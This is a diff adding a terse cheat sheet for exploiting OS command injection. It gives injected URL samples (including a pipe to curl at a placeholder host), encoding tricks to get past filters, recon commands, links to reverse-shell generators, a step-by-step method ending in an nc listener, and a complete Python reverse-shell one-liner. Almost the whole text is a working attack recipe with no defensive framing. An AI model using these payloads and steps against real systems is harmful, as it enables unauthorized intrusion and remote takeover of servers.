@@ -1,0 +1,41 @@
+OS Command:
+
+nmap -sV -sC <ip>
+
+Sample:
+▶ https://www.example.com/help.php?view=faq || sleep 15
+▶ https://www.example.com/help.php?view=faq | curl https://www.yoursite.com/
+
+Note:
+▶ you must try to url encoding or double url encoding and base 64 etc
+▶ you must try to space or change + with space
+▶ You must try with commands:
+whoami, id, ifconfig/ip addr, uname -, ps -ef [for linux]
+whoami, ver, ipconfig, tasklist, netstat -an [for windows]
+
+For Reverse Shell:
+Firefox Extention: hack Tools
+https://www.revshells.com/
+https://tex2e.github.io/reverse-shell-generator/index.html
+https://weibell.github.io/reverse-shell-generator/
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+https://github.com/payloadbox/command-injection-payload-list
+
+Method:
+▶ First Find the parameter where os Command injected
+▶ then first know the os linux or windows via recon or nmap 
+▶ then try normal os command and if you are blocking try to bypassing via previous notes
+▶ if you see that os command is executed try to reverse shell
+▶ Here {"local ip",port} must be changed
+▶ then this type is listening via terminal nc -lvnp port
+▶ If you see that it is listening thats mean its crack
+▶ use  ; & && |or| those for connecting
+▶ Connector : |, ||, &, ;, &&, 
+
+Reverse shell:
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("local ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+-------------------------------------------------------------------------------------------
+
+
+
